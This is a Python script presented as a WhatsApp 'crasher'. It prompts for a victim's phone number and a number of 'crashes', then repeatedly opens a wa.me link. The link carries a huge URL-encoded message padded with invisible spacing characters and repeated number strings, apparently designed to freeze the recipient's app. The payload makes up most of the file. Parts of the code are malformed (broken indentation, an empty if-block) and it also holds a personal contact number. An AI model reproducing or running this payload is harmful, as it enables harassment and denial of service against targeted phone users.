#i will like to give special thanks to mr juice for this awesome script
import os
import colorama
import time
import sys
from colorama import  Fore,Style
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
try:
	import colorama
except ModuleNotFoundError:
	print("Requests is not Installed")
	os.system("pip install colorama")

logo = f"""
{C}                                                                                                      
    
 |\       |》》》 
 |    \   |
 |    |   |》》》
 |    |   |
 |   /    |》》》 S T R O Y
 |/                                 
                                                   
{W}
Coded by: Timmy								  
"""
os.system('clear')

def main():
	os.system('clear')
	print(logo)
	print()
	cncode=int(input(f'{G}[{Y}+{G}]{M} Enter Country Code Without "+" eg.234 {C}=> '))
	print()
	num=input(f"{G}[{Y}+{G}]{M} Enter the Victim's Phone number\n\n{C}=> {cncode}  ")
	print()
	crash=int(input(f'{G}[{Y}+{G}]{M} Enter the number of crashes {W}(Max 15 per 30min) \n\n{C}=> '))
	combnum = f"+{cncode}{num}"
	print()
	Finalcall=input(f'{G}[?]{W} Do You Want To Change NO.{W}{combnum} {R}(Y/N)\n\n{C}=> ')
	if Finalcall == 'Y'  or Finalcall == 'y':
		main()
	elif Finalcall == 'N' or Finalcall == 'n':
		os.system('clear')
		print(f"{G}[{Y}+{G}]{M}Sending JT Virtex😈 to Crash Whatsapp on No. : +{cncode}{num} ...")
		time.sleep(5)
		link = (f"""xdg-open https://wa.me/{combnum}/?text=MR JUICE'S 💣 XPH4N70M• VIRUS💣😊Follow Me On https://bio.link/mrjuice🔥WA_CRASHER 1%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40XPHANTOM_PH4N70M%F0%9F%A4%A3%0A%F0%9F%94%A5WA_CRASHER%201%20WA_CRASH%20%F0%9F%98%88%0A*NULL%0A*9999999999*%20*X*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*XPHANTOM%20CRATER%20MR%20PH4N70M%20X%C2%B2*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2KILLER-XPHANTOM%F0%9F%92%A3%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*
""")
	for i in range (crash):
		print()
		print(f"{Y}[✓] Sending Now\n")
		print(f"{G}[{Y}+{G}]{M}Applying 40sec delay...")
		link1 = os.system(link)
		time.sleep(40)
		if link1 == 0:
			print(f"{G} Successfully Destroyed With JT Virtex")
			pass
		else:
	            print(f"{R} there was an error bro😑 try again ")
                    time.sleep(1)
                    os.system('clear')   
def MSG():
	  print("Thanks To Mr Juice for this awesome script I can't thank him enough")
          chat = print(f"{G} do you want to chat with me")
          if chat == 'Y' or chat == 'y':
          Gd = (f"xdg-open https://wa.me/2348050261876")
          os.system(Gd)
          time.sleep(1)
          print("pls follow my github😉😎")
          main()
MSG()      
